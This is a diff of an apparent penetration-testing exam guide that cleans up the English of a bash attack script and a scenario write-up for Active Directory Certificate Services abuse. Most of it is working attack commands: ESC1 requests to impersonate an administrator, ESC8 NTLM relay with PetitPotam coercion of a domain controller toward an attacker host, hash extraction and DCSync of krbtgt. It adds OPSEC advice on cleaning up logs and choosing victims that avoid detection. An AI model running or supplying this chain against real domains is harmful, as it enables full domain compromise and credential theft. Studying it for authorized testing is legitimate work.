-**Exam / OPSEC notes**: `certipy find -vulnerable` The output will list the global question templates, only those required by the scenario; applying for a certificate will be written to the CA log, pretending to be the object to select the scenario target (administrator/machine account), do not apply for irrelevant certificates randomly for "testing".
+**Exam / OPSEC notes**: `certipy find -vulnerable` output lists every problem template in the domain — only look at the ones the scenario needs. Requesting a certificate writes to the CA log, so pick an impersonation target that fits the scenario (an administrator/machine account); do not request unrelated certificates just to "test".
 
 ---
 
@@ -2418,51 +2437,62 @@ impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC0
 ````bash
 #!/usr/bin/env bash
 # =============================================================================
-# Purpose: Encapsulation of the two main lines of ADCS - ESC1 (the applicant can provide a template for the SAN, and directly impersonate the administrator with low permissions)
-#       With ESC8 (NTLM relay to ADCS HTTP registration endpoint for certificate exchange), plus template enumeration, PFX→ccache
-#       Flow and dependency self-checking. Each mode prints the complete command first, and then adds -x before it is actually executed.
-# Scenario: M12 Scenario 54 (low-authority domain users apply for incorrectly configured certificate templates) and Scenario 55 (CA exists and can relay
-#       HTTP registration portal).
-# Dependencies: certipy (Kali 2023+ package name certipy-ad, pipx install certipy-ad; the old version is called certipy,
-#       The script automatically detects both); impacket(impacket-ntlmrelayx/impacket-petitpotam/
-#       impacket-secretsdump, sudo apt install -y impacket-scripts); openssl (PFX teardown).
-# Use: ./m12-adcs-esc1-esc8.sh -m deps
+# Purpose: wrappers for the two main ADCS routes -- ESC1 (a template whose
+#       enrollee supplies the SAN, low privileges impersonate an administrator
+#       directly) and ESC8 (relay NTLM to the ADCS HTTP enrollment endpoint and
+#       trade it for a certificate), plus template enumeration, PFX -> ccache
+#       handling and a dependency self-check. Every mode prints the full command
+#       first, and only runs it when -x is given.
+# Scenarios: M12 scenario 54 (a low-privilege domain user requests a
+#       misconfigured certificate template) and scenario 55 (the CA exposes a
+#       relayable HTTP enrollment endpoint).
+# Dependencies: certipy (Kali 2023+ package name certipy-ad, pipx install
+#       certipy-ad; older builds call it certipy, the script probes for both);
+#       impacket (impacket-ntlmrelayx / impacket-petitpotam /
+#       impacket-secretsdump, sudo apt install -y impacket-scripts); openssl (to
+#       split the PFX).
+# Usage: ./m12-adcs-esc1-esc8.sh -m deps
 #       ./m12-adcs-esc1-esc8.sh -m find -d corp.local -s DC01.corp.local -u USER -p 'PASS'
 #       ./m12-adcs-esc1-esc8.sh -m req  -d corp.local -s DC01.corp.local -c CA01.corp.local \
 #            -n 'CORP-CA' -t 'VulnTemplate' -U administrator@corp.local -u USER -p 'PASS' -o admin
 #       ./m12-adcs-esc1-esc8.sh -m auth -P admin.pfx -d corp.local -s DC01.corp.local
 #       ./m12-adcs-esc1-esc8.sh -m relay -c CA01.corp.local -t Machine -l LHOST -V DC01.corp.local \
 #            -d corp.local -s DC01.corp.local -u USER -p 'PASS'
-# Placeholders (all passed in via parameters, no real values ​​are written in the script):
-#   DOMAIN = domain FQDN (-d) TARGET = DC/CA host (-s/-c/-V)
-#   USER/PASS/NTHASH = Credentials (-u/-p/-H) LHOST = Attacker IP (-l, relay listening host)
-#   URL = relay target endpoint (spelled out by -c http://CA01.corp.local/certsrv/certfnsh.asp)
-# Test status: Not tested in a real ADCS environment; local bash -n passed. By default, only print commands are executed (executed only with -x).
-#           It is convenient to check the CA name/template name before proceeding.
+# Placeholders (all passed as arguments, no real values inside the script):
+#   DOMAIN = domain FQDN (-d)  TARGET = DC/CA host (-s / -c / -V)
+#   USER / PASS / NTHASH = credentials (-u / -p / -H)  LHOST = attacker IP (-l, relay listener host)
+#   URL = relay target endpoint (built from -c as http://CA01.corp.local/certsrv/certfnsh.asp)
+# Test status: not tested against a real ADCS environment; bash -n passes locally.
+#           Commands are printed only by default (-x executes), so you can check
+#           the CA name/template name before acting.
 # Differences from docs/12-ad-attacks.md:
-#   1) Document Scenario 55 only lists two commands: ntlmrelayx and petitpotam. This script also adds relay mode.
-#      Pre-check of "first verify whether EPA is on" (curl detects certsrv return code), because EPA is 55 scenarios
-#      The number one reason for failure is to continue relaying without opening EPA.
-#   2) Document 54 scenario includes pfx→ccache in the auth step. This script removes the pfx2ccache mode and puts
-#      The two steps of openingssl to remove PEM and certipy auth to remove ccache are clearly listed.
-#   3) In the document, `-upn administrator@corp.local` is passed in with -U, and the default value is administrator@<DOMAIN>.
+#   1) The doc's scenario 55 lists only the ntlmrelayx and petitpotam commands;
+#      this script's relay mode adds the "verify whether EPA is enabled"
+#      pre-check (curl probe of the certsrv response code), because EPA is the
+#      number one failure cause in scenario 55; only when EPA is off does it
+#      start the relay.
+#   2) The doc's scenario 54 folds pfx -> ccache into the auth step; this script
+#      splits out a pfx2ccache mode that spells out both steps: the openssl PEM
+#      split and the certipy auth run that produces the ccache.
+#   3) In the doc `-upn administrator@corp.local` is passed via -U, with the
+#      default administrator@<DOMAIN>.
 # =============================================================================
 set -u
 
 MODE="deps"
 DOMAIN=""      # -d
-DC=""          # -s  DC（TARGET）
-CAHOST=""      # -c  CA Host（TARGET）
-CANAME=""      # -n  CA name, such as CORP-CA
-TEMPLATE=""    # -t  Certificate template name
+DC=""          # -s  DC (TARGET)
+CAHOST=""      # -c  CA host (TARGET)
+CANAME=""      # -n  CA name, e.g. CORP-CA
+TEMPLATE=""    # -t  certificate template name
 USER=""        # -u
 PASS=""        # -p
 NTHASH=""      # -H
-UPN=""         # -U  ESC1 object to impersonate UPN
-PFX=""         # -P  pfx document
-OUT="admin"    # -o  Output prefix
-LHOST=""       # -l  attack aircraft IP（Relay monitoring/induced target）
-VICTIM=""      # -V  Victims who are induced to authenticate (usually DC FQDN）
+UPN=""         # -U  UPN of the object ESC1 will impersonate
+PFX=""         # -P  pfx file
+OUT="admin"    # -o  output prefix
+LHOST=""       # -l  attacker IP (relay listener / coercion target)
+VICTIM=""      # -V  victim coerced into authenticating (usually a DC FQDN)
 LOOT="$HOME/osep/loot/certs"
 EXEC=0         # -x
 
@@ -2470,32 +2500,32 @@ usage() {
     sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
     cat <<'EOF'
 
-parameter：
-  -m <mode>   mode (default deps）：
-       deps        Rely on self-test（certipy / ntlmrelayx / petitpotam / openssl）
-       find        enumeration template：certipy find -vulnerable -stdout（scene 54 first step）
-       req         ESC1 Apply：certipy req -template ... -upn ...（scene 54 Step 2）
-       auth        use PFX Change NTLM Hash：certipy auth -pfx（scene 54/55 Universal）
-       pfx2ccache  PFX -> PEM -> ccache The complete circulation (get the ticket to play -k tool）
-       relay       ESC8：detection EPA + rise ntlmrelayx --adcs + Print trigger command (scenario 55）
-       all         deps + find + req + auth Command skewering (sequential execution requires -x）
-  -d <fqdn>    domain FQDN（DOMAIN），find/req/auth/relay need
-  -s <host>    DC Host（TARGET），majority mode -dc-ip Target
-  -c <host>    CA Host FQDN（TARGET），req/relay need
-  -n <name>    CA name（certipy find in the output CA Name），req need
-  -t <tpl>     Certificate template name，req=Vulnerability templates (such as VulnTemplate），relay=Machine
-  -u <user>    domain user（USER）
-  -p <pass>    clear text password（PASS）
-  -H <hash>    NTHASH（certipy of -hashes form）
-  -U <upn>     ESC1 Impersonating the target UPN，default administrator@<DOMAIN>
-  -P <file>    PFX file path（auth / pfx2ccache need）
-  -o <prefix>  Output prefix, default admin（output admin.pfx）
-  -l <ip>      LHOST：attack aircraft IP，relay The address to which the victim returns when triggered.
-  -V <host>    The victim host that is induced to authenticate (default is -s of DC）
-  -x           Really execute (default only prints the command）
-  -h           This help
+Parameters:
+  -m <mode>   mode (default deps):
+       deps        dependency self-check (certipy / ntlmrelayx / petitpotam / openssl)
+       find        enumerate templates: certipy find -vulnerable -stdout (scenario 54, step 1)
+       req         ESC1 request: certipy req -template ... -upn ... (scenario 54, step 2)
+       auth        trade a PFX for the NTLM hash: certipy auth -pfx (shared by scenarios 54/55)
+       pfx2ccache  full PFX -> PEM -> ccache flow (take the ticket to -k tools)
+       relay       ESC8: probe EPA + start ntlmrelayx --adcs + print the trigger command (scenario 55)
+       all         deps + find + req + auth command medley (needs -x to run in order)
+  -d <fqdn>    domain FQDN (DOMAIN); needed by find/req/auth/relay
+  -s <host>    DC host (TARGET), the -dc-ip target for most modes
+  -c <host>    CA host FQDN (TARGET); needed by req/relay
+  -n <name>    CA name (the CA Name in certipy find output); needed by req
+  -t <tpl>     certificate template name; req=vulnerable template (e.g. VulnTemplate), relay=Machine
+  -u <user>    domain user (USER)
+  -p <pass>    cleartext password (PASS)
+  -H <hash>    NTHASH (in the certipy -hashes form)
+  -U <upn>     UPN of the object ESC1 will impersonate, default administrator@<DOMAIN>
+  -P <file>    PFX file path (needed by auth / pfx2ccache)
+  -o <prefix>  output prefix, default admin (produces admin.pfx)
+  -l <ip>      LHOST: attacker IP, the address the victim connects back to when the relay is triggered
+  -V <host>    victim host coerced into authenticating (defaults to the DC from -s)
+  -x           actually execute (print the commands only by default)
+  -h           this help
 
-exit code：0 normal / 1 Parameter or dependency error
+Exit codes: 0 normal / 1 argument or dependency error
 EOF
     exit 0
 }
@@ -2505,7 +2535,7 @@ info() { printf '[*] %s\n' "$*"; }
 head_() { printf '\n===== %s =====\n' "$*"; }
 have() { command -v "$1" >/dev/null 2>&1; }
 
-# Print command line: Only add single quotes to parameters containing spaces/quotes to ensure that the output can be directly copied and executed.
+# Print a command line: only quote arguments containing spaces/quotes, so the output can be copy-pasted as is
 printable() {
     local out="" a
     for a in "$@"; do
@@ -2521,10 +2551,10 @@ run() {
     printable "$@"
     if [ "$EXEC" != "1" ]; then return 0; fi
     if ! have "$1"; then
-        err "Missing command: $1 (certipy: pipx install certipy-ad; impacket: sudo apt install -y impacket-scripts)"
+        err "missing command: $1 (certipy: pipx install certipy-ad; impacket: sudo apt install -y impacket-scripts)"
         return 0
     fi
-    "$@" || err "The previous command returned non-zero: troubleshoot by output (CA name/template name/authority/EPA)"
+    "$@" || err "the previous command returned non-zero: troubleshoot from the output (CA name/template name/permissions/EPA)"
     return 0
 }
 
@@ -2550,14 +2580,14 @@ while getopts "m:d:s:c:n:t:u:p:H:U:P:o:l:V:xh" opt; do
     esac
 done
 
-# certipy binary detection: The new version of Kali is called certipy-ad, and the old environment/manual installation is called certipy
+# certipy binary probe: newer Kali calls it certipy-ad, older/manual installs call it certipy
 CERTIPY=""
 if have certipy; then CERTIPY="certipy"
 elif have certipy-ad; then CERTIPY="certipy-ad"
-else CERTIPY="certipy"   # For printing；deps The mode will clearly report an error
+else CERTIPY="certipy"   # for printing only; the deps mode reports this explicitly
 fi
 
-# Credentials: array format for actual execution (will not be split by the shell, passwords with spaces/special characters are also safe)
+# Credentials: array form for actual execution (the shell will not split them again, so passwords with spaces/special characters are safe)
 CREDS=()
 build_creds() {
     if [ -n "$PASS" ]; then
@@ -2569,7 +2599,7 @@ build_creds() {
     fi
 }
 
-# Credentials: string form, only used for "print for human viewing" command line
+# Credentials: string form, only for command lines that are "printed for a human"
 creds_fragment() {
     if [ -n "$PASS" ]; then
         printf -- "-u '%s@%s' -p '%s'" "$USER" "$DOMAIN" "$PASS"
@@ -2596,18 +2626,18 @@ require() {
         shift
     done
     if [ -n "$missing" ]; then
-        err "Mode -m $MODE missing required argument: $missing"
-        err "(Use -h to view the parameters required for each mode)"
+        err "mode -m $MODE is missing required arguments:$missing"
+        err "(use -h to see which arguments each mode needs)"
         exit 1
     fi
 }
 
 # ---------------------------------------------------------------------------
 mode_deps() {
-    head_ "Dependency self-test (deps)"
+    head_ "dependency self-check (deps)"
     local ok=1
     if [ "$CERTIPY" = "certipy" ] && ! have certipy; then
-        err "certipy is not installed: pipx install certipy-ad (Kali 2023+ command name certipy-ad)"
+        err "certipy is not installed: pipx install certipy-ad (on Kali 2023+ the command name is certipy-ad)"
         ok=0
     else
         info "certipy     : $CERTIPY ($(command -v "$CERTIPY"))"
@@ -2616,94 +2646,94 @@ mode_deps() {
         if have "$t"; then info "$t : installed"; else
             case "$t" in
                 openssl|curl) err "$t is missing: sudo apt install -y $t" ;;
-                *) err "$t is missing: sudo apt install -y impacket-scripts (or use python3 -m pip install impacket)" ;;
+                *)            err "$t is missing: sudo apt install -y impacket-scripts (or python3 -m pip install impacket)" ;;
             esac
             ok=0
         fi
     done
     echo
-    info "Certificate and ticket product directory: ${LOOT} (it will be created automatically if it does not exist)"
-    mkdir -p "$LOOT" 2>/dev/null || err "Failed to create $LOOT (does not affect print mode)"
-    if [ "$ok" = "1" ]; then info "Complete dependencies."; else info "If there are any missing items, please fill them in according to the installation command above before continuing."; fi
+    info "certificate and ticket output directory: ${LOOT} (created automatically if absent)"
+    mkdir -p "$LOOT" 2>/dev/null || err "failed to create $LOOT (does not affect print mode)"
+    if [ "$ok" = "1" ]; then info "dependencies complete."; else info "some are missing; install them with the commands above before continuing."; fi
 }
 
 # ---------------------------------------------------------------------------
 mode_find() {
     require DOMAIN DC USER
-    head_ "Template enumeration (find, step 1 of Scenario 54) - full quantity first, then -vulnerable"
+    head_ "template enumeration (find, scenario 54 step 1) -- full list first, then look at -vulnerable"
     build_creds
-    info "Full enumeration (retain JSON/text products for easy review of CA Name and template lists):"
+    info "full enumeration (keep the JSON/text output so you can look up CA Name and the template list later):"
     run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -stdout
     echo
-    info "Just look at the available items (more commonly used in exams):"
+    info "exploitable entries only (more common in an exam):"
     run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -vulnerable -stdout
     echo
-    info "Output to file (convenient for grep):"
+    info "write to files (easy to grep):"
     echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -vulnerable -stdout > $LOOT/find-vuln.txt"
     echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -stdout > $LOOT/find-all.txt"
     echo
-    info "ESC1 four conditions (must be met at the same time):"
-    info "① When opening the template, the applicant must provide SAN (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, -upn can be filled in)"
-    info "② EKU includes Client Authentication (or Any Purpose)"
-    info "③ The current user/group has Enroll permission for the template"
-    info "④ CA certificate manager approval is not enabled (otherwise the application will be suspended)"
-    info "Don't try hard if you're not satisfied, go to ESC8 (scenario 55) or go back to the delegation/LAPS route."
+    info "the four ESC1 conditions (all must hold at once):"
+    info "  ① the template enables enrollee-supplied SAN (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, you can fill in -upn)"
+    info "  ② the EKU includes Client Authentication (or Any Purpose)"
+    info "  ③ the current user/its group has Enroll permission on the template"
+    info "  ④ CA Manager Approval is not enabled (otherwise the request is left pending)"
+    info "if they do not hold, do not force it: go to ESC8 (scenario 55) or back to the delegation/LAPS routes."
 }
 
 # ---------------------------------------------------------------------------
 mode_req() {
     require DOMAIN DC CAHOST CANAME TEMPLATE USER
     [ -z "$UPN" ] && UPN="administrator@$DOMAIN"
-    head_ "ESC1 application (req, scenario 54 step 2)"
+    head_ "ESC1 request (req, scenario 54 step 2)"
     build_creds
-    info "Impersonation object UPN: ${UPN} (must be a real user, DC will verify)"
+    info "impersonation target UPN: ${UPN} (must be a user that really exists, the DC validates it)"
     run $CERTIPY req "${CREDS[@]}" -ca "$CANAME" -target "$CAHOST" \
         -template "$TEMPLATE" -upn "$UPN" -dc-ip "$DC" -out "$OUT"
     echo
-    info "Output: $OUT.pfx (certipy can be used directly without password protection)"
-    info "Next step: ./m12-adcs-esc1-esc8.sh -m auth -P $OUT.pfx -d $DOMAIN -s $DC"
+    info "output: $OUT.pfx (usable directly when certipy leaves it unprotected)"
+    info "next: ./m12-adcs-esc1-esc8.sh -m auth -P $OUT.pfx -d $DOMAIN -s $DC"
     echo
-    info "Failed branch:"
-    info "· 0x80094012 (certificate policy mismatch) -> Template EKU does not contain client authentication, replace -t candidate"
-    info "· Permission denied -> The current user does not have Enroll rights for this template; the UPN of -U does not exist or does not match"
-    info "· CA name/host resolution failed -> Get CA Name and DNS host name from find output,"
-    info "Use -n / -c to point to the past, and point /etc/hosts to the real IP if necessary"
+    info "failure branches:"
+    info "  - 0x80094012 (certificate policy does not match) -> the template EKU lacks client authentication, try the next -t candidate"
+    info "  - permission denied -> the current user has no Enroll right on that template; the -U UPN does not exist or does not match"
+    info "  - CA name/host resolution fails -> take CA Name and the DNS host name from the find output and"
+    info "    point -n / -c at them; if needed put the CA FQDN and its real IP in /etc/hosts"
 }
 
 # ---------------------------------------------------------------------------
 mode_auth() {
     require PFX DOMAIN DC
-    head_ "Certificate authentication (auth) - swap PFX for NTLM hash"
+    head_ "certificate authentication (auth) -- trade the PFX for the NTLM hash"
     run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
     echo
-    info "After getting NTHASH:"
+    info "once you have the NTHASH:"
     echo "impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH $DOMAIN/Administrator@$DC"
     echo "impacket-wmiexec $DOMAIN/Administrator@$DC -hashes :NTHASH"
     echo
-    info "Explicitly specify the username (when UPN is inconsistent with sAMAccountName):"
+    info "specify the username explicitly (when the UPN and sAMAccountName differ):"
     echo "$CERTIPY auth -pfx $PFX -username administrator -domain $DOMAIN -dc-ip $DC"
     echo
-    info "Failed branch: The application is successful but auth fails -> rerun req and use -o to overwrite the certificate, or give -username explicitly."
+    info "failure branch: the request succeeded but auth fails -> re-run req and overwrite the certificate with -o, or pass -username explicitly."
 }
 
 # ---------------------------------------------------------------------------
 mode_pfx2ccache() {
     require PFX DOMAIN DC
-    head_ "PFX -> PEM -> ccache transfer (pfx2ccache)"
-    info "① Disassemble PFX into PEM (required for some tools/manual verification; the default password of certipy is empty)"
+    head_ "PFX -> PEM -> ccache flow (pfx2ccache)"
+    info "① split the PFX into PEM (some tools/manual checks need it; certipy defaults to an empty password)"
     echo "openssl pkcs12 -in $PFX -out ${PFX%.*}.pem -nodes -passin pass:"
-    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40 # See issuer and SAN"
+    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40     # check issuer and SAN"
     echo
-    info "② certipy auth produces hash and ccache at the same time (ccache file name = user name in the certificate)"
+    info "② certipy auth produces both the hash and a ccache (ccache filename = the username in the certificate)"
     run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
     echo
-    info "③ Use ccache to run the -k tool (connected to m12-kerberos-tickets-linux.sh)"
+    info "③ use the ccache against -k tools (joins up with m12-kerberos-tickets-linux.sh)"
     echo "export KRB5CCNAME=administrator.ccache"
     echo "klist -e"
     echo "impacket-secretsdump -k -no-pass $DC"
     echo "impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC"
     echo
-    info "Confirm whether the SAN is the one you want to impersonate: openssl x509 -in ${PFX%.*}.pem -noout -text | grep -A1 'Subject Alternative Name'"
+    info "confirm the SAN holds the object you want to impersonate: openssl x509 -in ${PFX%.*}.pem -noout -text | grep -A1 'Subject Alternative Name'"
 }
 
 # ---------------------------------------------------------------------------
@@ -2711,46 +2741,46 @@ mode_relay() {
     require CAHOST
     [ -z "$VICTIM" ] && VICTIM="$DC"
     [ -z "$TEMPLATE" ] && TEMPLATE="Machine"
-    [ -z "$LHOST" ] && LHOST="LHOST"      # Not given -l print by placeholder
-    [ -z "$VICTIM" ] && VICTIM="TARGET"   # Not given -V/-s print by placeholder
+    [ -z "$LHOST" ] && LHOST="LHOST"      # print as a placeholder when -l is not given
+    [ -z "$VICTIM" ] && VICTIM="TARGET"   # print as a placeholder when -V/-s is not given
     [ -z "$DOMAIN" ] && DOMAIN="DOMAIN"
-    head_ "ESC8 relay (relay, scene 55)"
+    head_ "ESC8 relay (relay, scenario 55)"
     local url="http://$CAHOST/certsrv/certfnsh.asp"
-    info "Relay target URL: $url"
+    info "relay target URL: $url"
 
-    echo "# ① Prerequisite: Confirm that Web Enrollment exists and EPA is not enabled (the number one failure reason)"
+    echo "# ① Pre-check: confirm Web Enrollment exists and EPA is not enabled (the number one failure cause)"
     echo "curl -s -o /dev/null -w '%{http_code}\\n' http://$CAHOST/certsrv/"
     echo "curl -s -o /dev/null -w '%{http_code}\\n' https://$CAHOST/certsrv/ -k"
-    info "Expectation: HTTP endpoint returns 200 or 401; if HTTPS must return 401 and HTTP is also abnormal -> EPA is probably turned on."
-    info "Under EPA, NTLM relay will be rejected by CA. There is no legal bypass path, so ESC8 will be abandoned directly and replaced with other entrances."
+    info "expected: the HTTP endpoint returns 200 or 401; if HTTPS always returns 401 and HTTP misbehaves too -> EPA is probably on,"
+    info "      under EPA the CA refuses NTLM relay, there is no legitimate bypass, drop ESC8 and pick another entry point."
     echo
 
-    echo "# ② Start relay (forward the received authentication to the ADCS HTTP registration endpoint)"
+    echo "# ② Start the relay (forward the authentication you receive to the ADCS HTTP enrollment endpoint)"
     run impacket-ntlmrelayx -t "$url" --adcs --template "$TEMPLATE" -smb2support -l "$LOOT"
     echo
 
-    echo "# ③ Open another terminal and trigger the victim (default DC machine account) to initiate authentication to LHOST"
+    echo "# ③ In another terminal, coerce the victim (the DC machine account by default) into authenticating to LHOST"
     if [ -n "$USER" ]; then
         run impacket-petitpotam -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" "$LHOST" "$VICTIM"
     else
         echo "impacket-petitpotam -u USER@$DOMAIN -p 'PASS' -dc-ip $DC LHOST $VICTIM"
     fi
-    echo "# Alternative trigger vector (when petitpotam is blocked by patch/firewall):"
+    echo "# alternative trigger vectors (when petitpotam is patched/blocked by a firewall):"
     echo "python3 /opt/PetitPotam/PetitPotam.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
     echo "python3 /opt/dementor/dementor.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
     echo
 
-    info "④ After 'Got NTLMv2 hash' + 'Server returned certificate' appears in the relay log:"
-    info "The certificate falls in ${LOOT} (base64 PFX, named like <user>.pfx)"
-    info "./m12-adcs-esc1-esc8.sh -m auth -P <certificate>.pfx -d $DOMAIN -s $DC"
+    info "④ once the relay log shows 'Got NTLMv2 hash' + 'Server returned certificate':"
+    info "   the certificate lands in ${LOOT} (base64 PFX, named like <user>.pfx)"
+    info "   ./m12-adcs-esc1-esc8.sh -m auth -P <cert>.pfx -d $DOMAIN -s $DC"
     echo
-    info "Failed branch:"
-    info "· No echo/401 after triggering -> Suspected EPA, give up ESC8 after confirmation, do not retry again and again"
-    info "· The trigger is successful but the certificate is rejected -> The template does not allow the victim to register, --template changes the template"
-    info "(First certipy find to see which templates are placed in the Domain Computers group)"
-    info "· No trigger vector available -> ESC8 is not established, go to other module entries"
-    info "OPSEC: Relay logs contain credential hashes, put them in the running directory ~/osep/logs and clean them afterwards;"
-    info "The victim prefers a DC machine account (the behavior is equivalent to the automatic registration of a normal machine)."
+    info "failure branches:"
+    info "  - nothing comes back after the trigger / 401 -> suspect EPA; once confirmed drop ESC8, do not retry in a loop"
+    info "  - the trigger works but the certificate is refused -> the template does not allow that victim to enroll, change --template"
+    info "    (run certipy find first to see which templates allow the Domain Computers group)"
+    info "  - no usable trigger vector -> ESC8 does not hold, move to another module's entry point"
+    info "OPSEC: the relay log contains credential hashes, run it from ~/osep/logs and clean up afterwards;"
+    info "      prefer the DC machine account as the victim (behaviorally it looks like normal machine auto-enrollment)."
 }
 
 # ---------------------------------------------------------------------------
@@ -2762,57 +2792,57 @@ case "$MODE" in
     pfx2ccache) mode_pfx2ccache ;;
     relay)      mode_relay ;;
     all)        mode_deps; mode_find; mode_req; mode_auth ;;
-    *) err "Unknown mode: $MODE"; usage ;;
+    *)          err "unknown mode: $MODE"; usage ;;
 esac
 
-printf '\n[*] Mode %s ended. By default, only the command is printed, add -x to actually execute it. \n' "$MODE"
-info "Product directory: ${LOOT} (certificate/PFX is exported to the attack machine in real time and cleans up the residue on the target side)"
+printf '\n[*] mode %s finished. Commands are printed only by default, add -x to actually run them.\n' "$MODE"
+info "output directory: ${LOOT} (export certificates/PFX to the attacker in good time and clean up leftovers on the target)"
 ````
 
-## Scenario 55: No ESC1 template is available, but the CA has a relayable HTTP registration portal (ESC8)
+## Scenario 55: No usable ESC1 template, but the CA exposes a relayable HTTP enrollment endpoint (ESC8)
 
-**Situation**: The target provides ADCS Web Enrollment (`http(s)://CA/certsrv/`); uses NTLM relay to relay the victim’s authentication to the registration endpoint to exchange the certificate. Typical victim: **DC machine account** (obtain DC identity certificate after successful relay → change hash → DCSync).
+**Situation**: The target offers ADCS Web Enrollment (`http(s)://CA/certsrv/`); you relay a victim's NTLM authentication to the enrollment endpoint and trade it for a certificate. The classic victim: **the DC machine account** (once the relay succeeds you get a certificate for the DC identity -> exchange it for the hash -> DCSync).
 
-**Assumptions**: There is already a domain credential that can be used to trigger authentication (normal domain users are sufficient, used for PetitPotam/PrinterBug); the attack machine can be actively connected by the victim (usually a DC machine account); the CA provides Web Enrollment and EPA is not enabled; the relay target template allows machine account registration. If any of the three is not true, this scenario will not work - verify them one by one before taking action.
+**Assumptions**: You already have a domain credential you can use to trigger authentication (an ordinary domain user is enough, for PetitPotam/PrinterBug); the attacker can be actively connected to by the victim (usually the DC machine account); the CA offers Web Enrollment with EPA not enabled; the relay target template allows machine accounts to enroll. If any of the three does not hold, this scenario is a dead end — verify each one before you act.
 
-**ESC8 relay conditions**: ① CA has enabled HTTP(S) Web Enrollment (`/certsrv/certfnsh.asp`) and **Extended Protection (EPA) is not enabled** - when EPA is turned on, NTLM relay will be rejected by CA (HTTP 401), which is the number one failure reason in this scenario; ② The template relayed to allows the victim (DC machine account) to register and EKU can be used for authentication; ③ The attack function can trigger the victim to initiate authentication (SpoolSample/PetitPotam/DFSCoerce) to the host where the **relay listener** is located.
+**ESC8 relay conditions**: ① the CA has HTTP(S) Web Enrollment enabled (`/certsrv/certfnsh.asp`) and **EPA is not enabled** — with EPA on, the CA refuses the NTLM relay (HTTP 401), and that is the number one failure cause in this scenario; ② the template you relay to allows the victim (the DC machine account) to enroll and has an EKU usable for authentication; ③ the attacker can coerce the victim into authenticating (SpoolSample/PetitPotam/DFSCoerce) to the host running the **relay listener**.
 
-**Prepare (attacker)**: `impacket-ntlmrelayx` (`--adcs` integrated certificate application), authentication trigger script (`impacket-petitpotam`/`printerbug`/`dementer`), `certipy` (use the replaced pfx); CA FQDN and `/etc/hosts` are configured first.
+**Prepare (attacker side)**: `impacket-ntlmrelayx` (with `--adcs` for integrated certificate requests), an authentication trigger script (`impacket-petitpotam`/`printerbug`/`dementer`), `certipy` (to use the PFX you get); configure the CA FQDN in `/etc/hosts` first.
 
-**Procedure**：
+**Procedure**:
 ```bash
-# ① Relay: Forward SMB authentication to ADCS HTTP registration endpoint
+# ① Start the relay: forward SMB authentication to the ADCS HTTP enrollment endpoint
 impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
   --adcs --template 'Machine' -smb2support -l /tmp/relay-loot
-# ② Trigger DC authentication to the attacking machine (open another terminal)
+# ② Coerce the DC into authenticating to the attacker (another terminal)
 impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
   LHOST DC01.corp.local
-# ③ Base64 pfx appears in the relay log → download → certipy to change the hash
+# ③ A base64 pfx appears in the relay log -> write it to disk -> exchange it with certipy
 certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
 impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
 ```
-**Scripts used**: `m12-adcs-esc1-esc8.sh` (relay mode: relay + trigger + pfx processing + dependency check).
+**Scripts used**: `m12-adcs-esc1-esc8.sh` (relay mode: start the relay + trigger + PFX handling + dependency check).
 
-**Validation**: ntlmrelayx log appears `Got NTLMv2 hash` + `Server returned certificate`; `certipy auth` outputs NTLM hash of victim machine account; DCSync succeeds with DC hash.
+**Validation**: the ntlmrelayx log shows `Got NTLMv2 hash` + `Server returned certificate`; `certipy auth` prints the NTLM hash of the victim machine account; DCSync with the DC hash succeeds.
 
-**Failure branches and alternatives**：
-- No response from relay after triggering/401 → suspected EPA Open: change HTTPS If the endpoint still doesn’t work, confirm EPA back**give up ESC8**（EPA There is no legal bypass path), return to ESC1/Other entrances; don’t waste time by trying again and again.。
-- Triggered successfully but certificate application rejected → The template does not allow the victim to register or the template has no authentication EKU，`ntlmrelayx --adcs --template` Change template (first `certipy find` See which templates are placed Domain Computers）。
-- No trigger vector available (all patches/firewall block RPC）→ ESC8 If there is no source of victim authentication, it is not feasible. Please switch to other module entrances.。
-- What the relay got was a low-value account certificate. → Change the trigger target (the domain administrator login session trigger is difficult to control，DC Machine account is the most stable）。
+**Failure branches and alternatives**:
+- After the trigger the relay shows nothing / 401 -> EPA is probably enabled: if the HTTPS endpoint fails too, confirm EPA and **drop ESC8** (there is no legitimate bypass under EPA), go back to ESC1/another entry point; do not retry in a loop and waste time.
+- The trigger works but the certificate request is refused -> the template does not allow that victim to enroll, or it has no authentication EKU; change the template in `ntlmrelayx --adcs --template` (run `certipy find` first to see which templates allow Domain Computers).
+- No usable trigger vector (all RPC paths patched or firewalled) -> ESC8 has no source of victim authentication and is not viable; move to another module's entry point.
+- The relay yields a certificate for a low-value account -> change the trigger target (triggering a domain admin logon session is hard to control, the DC machine account is the most reliable).
 
-**Exam / OPSEC notes**: `ntlmrelayx` will receive and forward the certification, the log contains the credential hash, and the running directory is placed in `~/osep/logs` and cleaned up afterwards; the CA's HTTP log will record the relayed application - prioritizing the DC machine account when selecting the victim (the behavior is equivalent to the automatic registration of a normal machine), to avoid forged domain management applications leaving obvious abnormalities.
+**Exam / OPSEC notes**: `ntlmrelayx` receives and forwards authentication and its log holds credential hashes, so run it from `~/osep/logs` and clean up afterwards; the CA's HTTP log records every relayed request — prefer the DC machine account as the victim (behaviorally it looks like a normal machine auto-enrolling), and avoid forging a domain admin request that leaves an obvious anomaly.
 
 ---
 
